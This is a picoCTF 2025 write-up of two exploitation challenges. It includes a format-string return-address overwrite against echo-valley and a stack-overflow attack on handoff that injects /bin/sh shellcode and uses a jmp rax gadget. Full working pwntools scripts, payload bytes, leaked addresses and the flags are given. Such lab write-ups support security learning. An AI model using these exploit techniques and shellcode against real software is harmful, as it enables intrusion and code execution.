---
title: picoCTF 2025 - echo-valley and handoff
author: Abhishek Satpathy
pubDatetime: 2025-03-21T23:35:23Z
modDatetime: 2025-03-27T05:24:55Z
slug: picoctf-2025-pwn
featured: false
draft: false
tags:
  - pwn
  - rev

description: Writeups for echo-valley and handoff in picoCTF 2025.
---

## Table of contents

## Introduction

There were a ton of cool challenges that I'd love to cover, but I chose these two because I love `pwn`.

Prerequisites

- ROP
- A basic understanding of assembly.
- A basic understanding of C.

## Echo Valley

Description:

> The echo valley is a simple function that echoes back whatever you say to it. But how do you make it respond with something more interesting, like a flag? \
> Download the source: [`valley.c`](https://github.com/asatpathy314/picoctf-2025/blob/main/pwn/echo-valley/valley.c) \
> Download the binary: [`valley`](https://github.com/asatpathy314/picoctf-2025/blob/main/pwn/echo-valley/valley)

We were given one hint which was:

> Ever heard of a format string attack?

Taking a look at the source code, what we need to do is relatively straightforward.

```c
void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}
```

We have a vulnerable call to `printf` that directly uses a buffer (i.e. `printf(buf);`) and it's in a loop meaning we can use it multiple times. Checking the protections with `pwntools` reveals that pretty much everything is enabled.

```shell
[*] '/home/ctf/picoctf-2025/pwn/echo-valley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Which means that our best path to securing the flag is to leak the address of the return value on the stack and replace it with the address of the `print_flag` function.

Using a sample payload I found some interesting addresses.

```shell
Welcome to the Echo Valley, Try Shouting:
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
You heard in the distance: 0x5555555560c1|(nil)|0x7ffff7f9ca00|(nil)|0x5555555596b0|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0xa7c70257c|(nil)|(nil)|0xf7a5753e67c48200|0x7fffffffe2d0|0x555555555413|0x1|0x7ffff7dafd90|(nil)|0x555555555401|0x100000000|0x7fffffffe3e8|(nil)|
```

In particular `%20$p` is almost always 8 bytes less than the address of the return value and `%21$p` is the return value. We can use the return value to determine the executable base and the leaked stack address to determine our format string exploit write address. From there, I got the address of the flag function (in the same process where I leaked the above addresses to ensure our offsets were accurate with ASLR enabled). Using all of these we could craft an exploit using pwntools. A few things to keep in mind.

- We can't use the stack base consistently without containerizing our exploit because it's possible (and very likely in fact) that the environment variables are different on remote than locally. Why does this matter? Because `env` vars are pushed to the stack before execution, so our return value address will be different on remote than on local if we use an offset from the stack base (i.e. `%1$lx`).
- Our payload can't be longer than 99 bytes.
- Our payload can't have a `\n` byte in it.

Using the information we got previously, I crafted the following exploit.

```python
from pwn import *

e = ELF("./valley")
context.binary = './valley'

LINK = "shape-facility.picoctf.net"
PORT = 65385
DEBUG = False

def create_process():
    if DEBUG:
        return process("./valley")
    else:
        return remote(LINK, PORT)

# Connect to the remote server
p = create_process()

# Send format string to leak addresses
p.sendline("%20$p|%21$p")

# Receive the leaked values
p.recvuntil("You heard in the distance: ")
leaks = p.recvline().strip().decode()
leaks = leaks.split("|")

# Parse the leaked addresses correctly
stack_address = int(leaks[0], 16) - 8
leak_address = int(leaks[1], 16)

print("The stack address is: ", hex(stack_address))

# Calculate the flag address
gdb_leak = 0x555555555413
gdb_flag = 0x555555555269
real_flag = (gdb_flag - gdb_leak) + leak_address
print(f"The flag() address is: {hex(real_flag)}")

# Create the format string payload to overwrite the return address
offset = 6  # Format string offset
payload = fmtstr_payload(offset, {stack_address: real_flag}, write_size="short")  # short worked best by trial and error
print(f"The length of the payload is {len(payload)} bytes.")

# Send the payload
p.sendline(payload)

p.sendline("exit")
p.interactive()
```

Flag: `picoctf{f1ckl3_f0rmat_f1asc0}`

## Handoff

No fun backstory :(

The challenge description states:

> Download the binary [here](https://github.com/asatpathy314/picoctf-2025/blob/main/pwn/handoff/handoff) \
> Download the source [here](https://github.com/asatpathy314/picoctf-2025/blob/main/pwn/handoff/handoff.c) \
> Connect to the program with netcat: \
> `$ nc shape-facility.picoctf.net 61121`

Taking a look at the source code reveals a few interesting vulnerabilities.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;

		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```

1. The name buffer is defined to have length 32 when in actuality the length of the buffer is 8. This gives us a 24 byte overflow whenever we write into name (i.e. in `Add Entry`).
2. The `Add Message` subroutine checks that the choice is not greater than or equal to the total number of entries. However, choice is parsed as a signed integer meaning we can input a negative number for a buffer underflow vulnerability.
3. We use `fgets` to read 32 bytes into the feedback buffer (which is 8 bytes long) on exit. The feedback buffer is declared first and is thus closest to the return value on the stack for the `vuln` function, and thus we have a way to hijack control of the program.

My initial approach was actually to use buffer underflow to rewrite the GOT table to call a malicious function or even to call our shellcode on the stack. Unfortunately although `pwntools` reveals that the executable is not a `PIE`, the stack base is still randomized (as it is always) meaning it's difficult to pinpoint where our underflow actually writes to. Further, we're limited by the limit that an integer can hold that would've prevented us from overwriting the GOT even if we did have an address leak. Instead I took a look at the third exploit which seemed the most promising.

Since we have room to write a return address on the stack, my mind immediately went to return-oriented programming.

```assembly
  40122d:	55                   	push   %rbp
  ...
  4013bc:	83 f8 03             	cmp    $0x3,%eax
  4013bf:	75 32                	jne    4013f3 <vuln+0x1ca>
  4013c1:	c7 85 1c fd ff ff ff 	movl   $0xffffffff,-0x2e4(%rbp)
  4013c8:	ff ff ff
  4013cb:	bf 40 21 40 00       	mov    $0x402140,%edi
  4013d0:	e8 cb fc ff ff       	call   4010a0 <puts@plt>
  4013d5:	48 8b 15 94 2c 00 00 	mov    0x2c94(%rip),%rdx        # 404070
  4013dc:	48 8d 45 f4          	lea    -0xc(%rbp),%rax
  4013e0:	be 20 00 00 00       	mov    $0x20,%esi
  4013e5:	48 89 c7             	mov    %rax,%rdi
  4013e8:	e8 c3 fc ff ff       	call   4010b0 <fgets@plt>
  4013ed:	c6 45 fb 00          	movb   $0x0,-0x5(%rbp)
  4013f1:	eb 19                	jmp    40140c <vuln+0x1e3>
  4013f3:	c7 85 1c fd ff ff ff 	movl   $0xffffffff,-0x2e4(%rbp)
  4013fa:	ff ff ff
  4013fd:	bf b6 21 40 00       	mov    $0x4021b6,%edi
  401402:	e8 99 fc ff ff       	call   4010a0 <puts@plt>
  401407:	e9 3d fe ff ff       	jmp    401249 <vuln+0x20>
  40140c:	90                   	nop
  40140d:	c9                   	leave
  40140e:	c3                   	ret
```

Taking a look at the assembly for `vuln`. I noticed that there was a 20 byte offset from the beginning of the `feedback` buffer and the return address (`8 + 0xc` from `push %rbp` and `lea    -0xc(%rbp),%rax`). That means we have exactly 11 bytes to work with, essentially one return and some change. This means most traditional ROP chains are off the table, but we can still work with 11 bytes. Looking back at what protections are enabled I noticed the stack was executable, that means we had a clear exploit pattern.

1. Use a register we control to load an address on the stack.
2. Jump to that address.
3. Execute shellcode.
4. Profit???

Once again looking at the assembly above, note that the address of the feedback buffer is loaded into `rax` and it isn't cleared. Which means that if we can find a `jmp rax` gadget we can execute up to 20 bytes of shellcode, which is more than enough to do something valuable (i.e. read the flag).

In fact, note that we can use option two to store up to 64 bytes of shellcode at a time in one of the `entry` structs. We can calculate this address using the value of `rax` and then jump to it in our 20 bytes of shellcode in order to execute even more shellcode! Now all we need to do is execute (pun intended).

```python
from pwn import *

LINK = "shape-facility.picoctf.net"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else None
DEBUG = bool(int(sys.argv[2])) if len(sys.argv) > 2 else True

e = context.binary = ELF("./handoff")

if DEBUG:
    p = process("./handoff")
else:
    p = remote(LINK, PORT)

"""
https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
BITS 64

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
"""

# First, add a recipient with our main shellcode
main_shellcode = b"\x31\xf6\x56\x48\xbb" +
                 b"\x2f\x62\x69\x6e\x2f" +
                 b"\x2f\x73\x68\x53\x54" +
                 b"\x5f\xf7\xee\xb0\x3b" +
                 b"\x0f\x05"
p.sendlineafter(b"app", b"1")
p.sendlineafter(b"name: ", main_shellcode)

"""
subq $724, %rax
push %rax
ret
"""

jump_shellcode = b"\x90\x90\x48\x2d\xd4" +
                 b"\x02\x00\x00\x50\xc3"

# Pad to reach the return address (20 bytes padding)
# Then use the jmp rax gadget (0x40116c) to the feedback buffer and then finally jmp to shellcode using rax-724
padding = b"\x00" * (20 - len(jump_shellcode))
payload = jump_shellcode + padding + p64(0x40116c)

# Trigger the ROP chain
p.sendlineafter(b"app", b"3")

if DEBUG:
    pause()  # Pause to attach debugger if needed

p.sendlineafter(b": ", payload)

# Get shell
p.interactive()
```

Flag: `picoCTF{p1v0ted_ftw_9dfb0dfe}`
